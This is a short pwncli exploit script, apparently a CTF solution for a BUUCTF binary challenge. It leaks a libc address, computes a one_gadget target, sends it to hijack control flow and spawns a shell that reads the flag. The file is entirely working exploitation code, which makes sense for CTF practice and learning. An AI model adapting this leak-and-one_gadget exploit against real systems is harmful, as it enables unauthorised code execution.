#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']

if gift.remote:
    libc = ELF("/home/roderick/glibc-all-in-one/buuctf_libc/x86/libc-2.23.so")
else:
    libc: ELF = gift['libc']

m = io.recvn(4)
libc_base = u32_ex(m) - libc.sym['_IO_2_1_stdout_']
log_libc_base_addr(libc_base)

if gift.debug:
    ags = get_current_one_gadget(libc_base)[1]
else:
    ags = one_gadget("/home/roderick/glibc-all-in-one/buuctf_libc/x86/libc-2.23.so")[0] + libc_base


log_ex(f"one_gadget: {hex(ags)}")

if ags > 0x7fffffff:
    ags -= 0x100000000

stop(0)

io.sendline(str(ags))

io.sendline("cat /flag")

# m = io.recvline_regex("flag{.*}")
# log_ex(f"{m}")
get_flag_when_get_shell(io)

io.interactive()